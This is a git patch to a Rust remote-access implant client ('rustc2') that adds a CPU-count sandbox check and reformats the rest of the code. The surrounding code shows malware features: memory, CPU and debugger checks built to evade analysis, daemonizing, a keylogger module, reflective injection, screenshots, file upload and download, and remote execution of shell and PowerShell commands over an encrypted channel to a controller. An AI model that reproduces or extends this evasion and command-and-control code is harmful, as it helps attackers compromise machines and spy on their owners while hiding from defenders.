@@ -1,0 +1,196 @@
+From ca1155dfcd1a520b1cde2810aa616809283de4c8 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Wed, 14 Oct 2026 07:44:09 +0700
+Subject: [PATCH 03/14] checkNumCPU
+
+---
+ client/src/main.rs    | 47 ++++++++++++++++++++++++++-----------------
+ client/src/sandbox.rs | 34 ++++++++++++++++++++++---------
+ 2 files changed, 54 insertions(+), 27 deletions(-)
+
+diff --git a/client/src/main.rs b/client/src/main.rs
+index 31a9e89..0306fc6 100644
+--- a/client/src/main.rs
++++ b/client/src/main.rs
+@@ -1,5 +1,6 @@
+ #![windows_subsystem = "windows"]
+ use clap::{arg, Command};
++use rand::rngs::OsRng;
+ use simple_crypt::{decrypt, encrypt};
+ use std::{
+     collections::HashMap,
+@@ -10,12 +11,11 @@ use std::{
+     time::Duration,
+ };
+ use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};
+-use rand::rngs::OsRng;
+-mod utils;
+-mod sandbox;
+ mod inject;
+ #[cfg(windows)]
+ mod keylogger;
++mod sandbox;
++mod utils;
+ 
+ use utils::ImportedScript;
+ 
+@@ -23,19 +23,20 @@ use utils::ImportedScript;
+ use daemonize::Daemonize;
+ #[cfg(unix)]
+ fn daemonize_process() {
+-     let daemonize = Daemonize::new()
+-     .pid_file("/tmp/rustc2.pid")
+-     .chown_pid_file(true)
+-     .working_directory("/tmp");
++    let daemonize = Daemonize::new()
++        .pid_file("/tmp/rustc2.pid")
++        .chown_pid_file(true)
++        .working_directory("/tmp");
+ 
+-     match daemonize.start() {
+-         Ok(_) => println!("Daemonized successfully"),
+-         Err(e) => eprintln!("Error, {}", e),
+-     }
++    match daemonize.start() {
++        Ok(_) => println!("Daemonized successfully"),
++        Err(e) => eprintln!("Error, {}", e),
++    }
+ }
+ 
+ fn main() {
+     sandbox::check_memory_limit();
++    sandbox::check_cpu_limit();
+     sandbox::sleep_evasion(Duration::from_secs(1));
+     #[cfg(windows)]
+     sandbox::check_debugger();
+@@ -93,7 +94,8 @@ fn main() {
+                     std::io::stdout().flush().unwrap();
+                     let stream_to_use = &mut stream;
+                     if command_clone.starts_with("||UPLOAD||") {
+-                        let output = utils::handle_upload(stream_to_use, &command_clone, shared_secret);
++                        let output =
++                            utils::handle_upload(stream_to_use, &command_clone, shared_secret);
+                         match output {
+                             Ok(_) => {
+                                 println!("Successfully uploaded file");
+@@ -105,7 +107,12 @@ fn main() {
+                     } else if command_clone.starts_with("||DOWNLOAD||") {
+                         utils::handle_download(stream_to_use, &command_clone, shared_secret);
+                     } else if command_clone.starts_with("||CMDEXEC||") {
+-                        utils::handle_cmd(stream_to_use, &command_clone, os.to_string(), shared_secret);
++                        utils::handle_cmd(
++                            stream_to_use,
++                            &command_clone,
++                            os.to_string(),
++                            shared_secret,
++                        );
+                     } else if command_clone.starts_with("||PSHEXEC||") {
+                         utils::handle_psh(stream_to_use, &command_clone, shared_secret);
+                     } else if command_clone.starts_with("||SCAN||") {
+@@ -114,7 +121,7 @@ fn main() {
+                         let output = utils::handle_import_psh(
+                             stream_to_use,
+                             &mut imported_scripts,
+-                            shared_secret
++                            shared_secret,
+                         );
+                         match output {
+                             Ok(_) => {
+@@ -125,9 +132,13 @@ fn main() {
+                             }
+                         }
+                     } else if command.starts_with("||RUNSCRIPT||") {
+-                        utils::handle_run_script(&mut stream, &command, &imported_scripts, shared_secret);
+-                    } else if command.starts_with("||INJECT||") 
+-                    {
++                        utils::handle_run_script(
++                            &mut stream,
++                            &command,
++                            &imported_scripts,
++                            shared_secret,
++                        );
++                    } else if command.starts_with("||INJECT||") {
+                         #[cfg(windows)]
+                         inject::reflective_inject(&mut stream, command, shared_secret);
+                     } else if command_clone.starts_with("||SCREENSHOT||") {
+@@ -171,4 +182,4 @@ pub fn shared_secret(stream: &mut TcpStream) -> SharedSecret {
+     stream.write(client_public_key.as_bytes()).unwrap();
+     stream.flush().unwrap();
+     shared_secret
+-}
+\ No newline at end of file
++}
+diff --git a/client/src/sandbox.rs b/client/src/sandbox.rs
+index ca1a488..520cd99 100644
+--- a/client/src/sandbox.rs
++++ b/client/src/sandbox.rs
+@@ -1,28 +1,41 @@
+-use sysinfo::System;
+ use std::process::exit;
+-use std::time::{Instant, SystemTime, Duration};
+ use std::thread::sleep;
++use std::time::{Duration, Instant, SystemTime};
++use sysinfo::System;
+ 
+ #[cfg(windows)]
+-use winapi::um::debugapi::{IsDebuggerPresent, CheckRemoteDebuggerPresent};
++use winapi::shared::ntdef::NT_SUCCESS;
++#[cfg(windows)]
++use winapi::um::debugapi::{CheckRemoteDebuggerPresent, IsDebuggerPresent};
+ #[cfg(windows)]
+ use winapi::um::processthreadsapi::{GetCurrentProcess, GetCurrentProcessId};
+ #[cfg(windows)]
+ use winapi::um::winnt::PEB;
+ #[cfg(windows)]
+ use winapi::um::winternl::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION};
+-#[cfg(windows)]
+-use winapi::shared::ntdef::NT_SUCCESS;
+ 
+ pub fn check_memory_limit() {
+     let mut system = System::new_all();
+     system.refresh_memory();
+ 
+     let total_memory = system.total_memory();
+-    if total_memory < 4_000_000_000 { // Less than 4GB — likely sandboxed
++    if total_memory < 4_000_000_000 {
++        // Less than 4GB — likely sandboxed
+         println!("Program is likely running in a sandboxed environment.");
+         exit(1);
+-    } 
++    }
++}
++
++pub fn check_cpu_limit() {
++    let mut system = System::new_all();
++    system.refresh_cpu_all();
++
++    let cpus = system.cpus().len();
++    if cpus < 2 {
++        // Less than 2 CPUs — likely sandboxed
++        println!("Program is likely running in a sandboxed environment.");
++        exit(1);
++    }
+ }
+ 
+ pub fn sleep_evasion(sleep_duration: Duration) {
+@@ -47,7 +60,11 @@ pub fn check_debugger() {
+     unsafe {
+         // 1. IsDebuggerPresent and CheckRemoteDebuggerPresent
+         let mut is_remote_debugger_present = 0;
+-        if IsDebuggerPresent() != 0 || (CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_remote_debugger_present) != 0 && is_remote_debugger_present != 0) {
++        if IsDebuggerPresent() != 0
++            || (CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_remote_debugger_present)
++                != 0
++                && is_remote_debugger_present != 0)
++        {
+             println!("Debugger detected! Exiting program.");
+             exit(1);
+         }
+@@ -82,4 +99,3 @@ mod tests {
+         sleep_evasion(Duration::from_millis(0));
+     }
+ }
+-
+-- 
+2.39.5 (Apple Git-154)
+
